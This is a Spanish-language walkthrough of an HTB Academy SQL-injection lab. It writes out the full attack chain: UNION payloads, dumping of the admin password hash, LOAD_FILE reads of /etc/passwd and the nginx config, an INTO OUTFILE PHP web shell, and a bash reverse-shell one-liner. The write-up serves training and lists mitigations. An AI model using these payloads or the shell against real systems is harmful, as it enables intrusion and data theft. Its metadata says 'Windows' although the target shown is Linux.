---
title: "Lab Final RCE Hash Admin"
platform: "HackTheBox"
os: "Windows"
difficulty: "Medium"
ip: "10.10.10.XXX"
slug: "lab-final-rce-hash-admin"
author: "Z4k7"
date: "2026-03-26"
year: "2026"
status: "pwned"
tags:
  - "lab"
  - "htb"
  - "academy"
  - "sqli"
  - "login"
  - "file"
  - "rce"
techniques:
  - "login bypass SQLi"
  - "UNION injection"
  - "information_schema enum"
  - "LOAD_FILE"
  - "INTO OUTFILE"
  - "web shell PHP"
  - "RCE"
tools:
  - "browser"
flags_list:
  - label: "Lab"
    value: "$argon2i$v=19$m=2048,t=4,p=3$dk4wdDBraE0zZVllcEUudA$CdU8zKxmToQybvtHfs1d5nHzjxw9DhkdcVToq6HTgvU"
summary: "Lab final del módulo SQL Injection Fundamentals de HTB Academy. Cadena de ataque completa: bypass de login via SQLi en campo 'code' → UNION injection en search → enumeración de tablas y columnas → extracción de hash Argon2i del admin → lectura de nginx config para identificar webroot → web shell PHP → RCE y flag.  ---"
steps:

  - id: "recon_1"
    num: "01"
    title: "Reconocimiento"
    content:
      - kind: "note"
        text: |
          Primero validamos reconociendo en la web para consultar posibles apartados vulnerables
          IP= 154.57.164.73:31198
          Plataforma:HTB
      - kind: "image"
        src: "assets/images/sqli/file-20260325131458766.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Contamos con un login en la web
      - kind: "image"
        src: "assets/images/sqli/file-20260325132218929.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          al momento de ingresar datos se registra información por medio de la url eso se evidencia en la parte inferior de la web donde podríamos tratar de tomar información de la BD   no permite ninguna interacion
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "Antes de atacar el login, mapea TODOS los puntos de entrada: login, registro, búsqueda, parámetros GET/POST, headers. En este lab el vector no está en el login sino en el registro — muchos juniors pierden tiempo atacando el punto equivocado."

  - id: "enum_1"
    num: "02"
    title: "Enumeración"
    content:
      - kind: "note"
        text: |
          al ingresar en el apartado de registro podemos tratar de inyectar un apartado en el code para saltar la validacion
      - kind: "image"
        src: "assets/images/sqli/file-20260325140105980.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Nos permite acceder sin problema alguno
      - kind: "image"
        src: "assets/images/sqli/file-20260325140126600.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Podemos validar que se puede aplicar el inyección en el apartado de search
      - kind: "image"
        src: "assets/images/sqli/file-20260325141545696.jpg"
        caption: "Evidencia técnica"
      - kind: "code"
        lang: "SQL"
        code: |
          ')UNION SELECT '1','2','3','4'-- -
      - kind: "note"
        text: |
          Menciona que se aplica consulta en 3 y4
      - kind: "image"
        src: "assets/images/sqli/file-20260325141629243.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          vamos a validar la versión del BD
      - kind: "code"
        lang: "SQL"
        code: |
          ')UNION SELECT '1','2',@@version,'4'-- -
      - kind: "image"
        src: "assets/images/sqli/file-20260325141930125.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Vamos a validar las tablas disponibles
      - kind: "code"
        lang: "SQL"
        code: |
          ') UNION SELECT NULL,NULL,table_name,NULL FROM information_schema.tables--
      - kind: "note"
        text: |
          Contamos con resultado
      - kind: "code"
        lang: "HTML"
        code: |
          ALL_PLUGINS, APPLICABLE_ROLES, CHARACTER_SETS, CHECK_CONSTRAINTS, COLLATIONS, COLLATION_CHARACTER_SET_APPLICABILITY, COLUMNS, COLUMN_PRIVILEGES, ENABLED_ROLES, ENGINES, EVENTS, FILES, GLOBAL_STATUS, GLOBAL_VARIABLES, KEYWORDS, KEY_CACHES, KEY_COLUMN_USAGE, OPTIMIZER_TRACE, PARAMETERS, PARTITIONS, PLUGINS, PROCESSLIST, PROFILING, REFERENTIAL_CONSTRAINTS, ROUTINES, SCHEMATA, SCHEMA_PRIVILEGES, SESSION_STATUS, SESSION_VARIABLES, STATISTICS, SQL_FUNCTIONS, SYSTEM_VARIABLES, TABLES, TABLESPACES, TABLE_CONSTRAINTS, TABLE_PRIVILEGES, TRIGGERS, USER_PRIVILEGES, VIEWS, CLIENT_STATISTICS, INDEX_STATISTICS, INNODB_FT_CONFIG, GEOMETRY_COLUMNS, INNODB_SYS_TABLESTATS, SPATIAL_REF_SYS, USER_STATISTICS, INNODB_TRX, INNODB_CMP_PER_INDEX, INNODB_METRICS, INNODB_FT_DELETED, INNODB_CMP, THREAD_POOL_WAITS, INNODB_CMP_RESET, THREAD_POOL_QUEUES, TABLE_STATISTICS, INNODB_SYS_FIELDS, INNODB_BUFFER_PAGE_LRU, INNODB_LOCKS, INNODB_FT_INDEX_TABLE, INNODB_CMPMEM, THREAD_POOL_GROUPS, INNODB_CMP_PER_INDEX_RESET, INNODB_SYS_FOREIGN_COLS, INNODB_FT_INDEX_CACHE, INNODB_BUFFER_POOL_STATS, INNODB_FT_BEING_DELETED, INNODB_SYS_FOREIGN, INNODB_CMPMEM_RESET, INNODB_FT_DEFAULT_STOPWORD, INNODB_SYS_TABLES, INNODB_SYS_COLUMNS, INNODB_SYS_TABLESPACES, INNODB_SYS_INDEXES, INNODB_BUFFER_PAGE, INNODB_SYS_VIRTUAL, user_variables, INNODB_TABLESPACES_ENCRYPTION, INNODB_LOCK_WAITS, THREAD_POOL_STATS, session_account_connect_attrs, Users, InvitationCodes, Messages
      - kind: "note"
        text: |
          lo anterior lista las tablas disponibles ya pasamos seleccionar la tabla y validar las columnas disponibles
      - kind: "code"
        lang: "SQL"
        code: |
          ')UNION SELECT NULL,NULL,column_name,NULL FROM information_schema.columns WHERE table_name='Users'--
      - kind: "note"
        text: |
          Tendremos columnas
      - kind: "image"
        src: "assets/images/sqli/file-20260325150049880.jpg"
        caption: "Evidencia técnica"
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "El payload `')` en lugar de `'` indica que la consulta original termina con `)` — común en apps que envuelven el input: `WHERE code = ('INPUT')`. Si `'` solo no funciona, prueba `')`, `'))`, hasta encontrar el cierre correcto."

  - id: "exploit"
    num: "03"
    title: "Explotación"
    content:
      - kind: "note"
        text: |
          Validamos y extraemos la información de las columnas
      - kind: "code"
        lang: "SQL"
        code: |
          ')UNION SELECT NULL,NULL,Username,Password FROM Users-- -
      - kind: "note"
        text: |
          tendemos el hash solicitado
      - kind: "image"
        src: "assets/images/sqli/file-20260325150323589.jpg"
        caption: "Evidencia técnica"

  - id: "flag_01"
    type: "flag"
    flag_items:
      - label: "Lab"
        value: "$argon2i$v=19$m=2048,t=4,p=3$dk4wdDBraE0zZVllcEUudA$CdU8zKxmToQybvtHfs1d5nHzjxw9DhkdcVToq6HTgvU"

  - id: "flag_01_post"
    num: ""
    title: "Post Flag"
    content:
      - kind: "note"
        text: |
          ¿Cuál es la ruta raíz de la aplicación web?
          Para validar el directorio de la web podremos validar si esta activo `LOAD_FILE()`
      - kind: "code"
        lang: "SQL"
        code: |
          ') UNION SELECT 1, 2, grantee, privilege_type FROM information_schema.user_privileges-- -
      - kind: "image"
        src: "assets/images/sqli/file-20260325150834269.jpg"
        caption: "Evidencia técnica"
      - kind: "code"
        lang: "SQL"
        code: |
          ') UNION SELECT 1, 2,LOAD_FILE("/etc/passwd"), '11'-- -
      - kind: "image"
        src: "assets/images/sqli/file-20260325152057853.jpg"
        caption: "Evidencia técnica"
      - kind: "code"
        lang: "SQL"
        code: |
          ') UNION SELECT 1, 2,LOAD_FILE("/etc/nginx/nginx.conf"), '11'-- -
      - kind: "code"
        lang: "C"
        code: |
          worker_processes auto;
          pid /run/nginx.pid;
          error_log /var/log/nginx/error.log;
          include /etc/nginx/modules-enabled/*.conf;
          
          events {
          	worker_connections 768;
          }
          
          http {
          	sendfile on;
          	tcp_nopush on;
          	types_hash_max_size 2048;
          	include /etc/nginx/mime.types;
          	default_type application/octet-stream;
          	ssl_protocols TLSv1 TLSv1.1 TLSv1.2 TLSv1.3;
          	ssl_prefer_server_ciphers on;
          	access_log /var/log/nginx/access.log;
          	gzip on;
          	include /etc/nginx/conf.d/*.conf;
          	include /etc/nginx/sites-enabled/*;
          }
      - kind: "note"
        text: |
          para validar el directorio raiz
      - kind: "code"
        lang: "SQL"
        code: |
          ') UNION SELECT 1, 2,LOAD_FILE("/etc/nginx/sites-enabled/default"), '11'-- -
      - kind: "image"
        src: "assets/images/sqli/file-20260325153241767.jpg"
        caption: "Evidencia técnica"
      - kind: "image"
        src: "assets/images/sqli/file-20260325153313049.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          > [!TIP] Agente
          > Leer configs del servidor web es el método más confiable para encontrar el webroot — más confiable que adivinar `/var/www/html`. Nginx en `sites-enabled/default` siempre revela el `root` directive.
          ---

  - id: "exploit_1"
    num: "04"
    title: "Acceso Inicial"
    content:
      - kind: "note"
        text: |
          Logra la ejecución remota de código y envía el contenido de /flag_XXXXXX.txt a continuación.
          En este caso vamos a tratar de generar una revershell
      - kind: "code"
        lang: "SQL"
        code: |
          ') UNION SELECT  1,2, variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
      - kind: "image"
        src: "assets/images/sqli/file-20260325154011133.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          validamos que contamos con el permiso `secure_file_priv`
          tratamos de ingresar un archivo nuevo al servidor
      - kind: "code"
        lang: "SQL"
        code: |
          ') UNION SELECT 1,2,'file written successfully!',4 into outfile '/var/www/chattr-prod/proof.txt'-- -
      - kind: "image"
        src: "assets/images/sqli/file-20260325164223133.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Procedemos a enviar la shell para extraer información
      - kind: "code"
        lang: "SQL"
        code: |
          ') UNION SELECT 1,2,'<?php system($_REQUEST[0]); ?>',4 into outfile '/var/www/chattr-prod/p.php'-- -
      - kind: "image"
        src: "assets/images/sqli/file-20260325164341767.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          validamos los directorios
      - kind: "image"
        src: "assets/images/sqli/file-20260325164519933.jpg"
        caption: "Evidencia técnica"
      - kind: "image"
        src: "assets/images/sqli/file-20260325164602767.jpg"
        caption: "../../../assets/images/sqli/file-20260325164602767.jpg"
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "Una vez que tienes RCE via web shell, escala a reverse shell interactiva — la web shell no tiene TTY, no tiene auto-complete y corta outputs largos. Desde la shell: `bash -c 'bash -i >& /dev/tcp/TU_IP/4444 0>&1'` con listener `nc -lvnp 4444`."

lessons:
  - 'El vector de inyección no siempre está donde parece — mapear TODOS los inputs antes de atacar'
  - 'El contexto de cierre de la query determina el payload: `''`, `'')`, `''))`, etc.'
  - 'Leer configs nginx/apache es el método más confiable para encontrar el webroot'
  - '`secure_file_priv` vacío + FILE privilege = camino directo a RCE'
mitigation:
  - 'Prepared statements en TODOS los puntos de entrada'
  - 'Nunca correr MySQL como root'
  - '`secure_file_priv` configurado fuera del webroot'
  - 'Monitoreo de creación de archivos `.php` en el webroot'
---
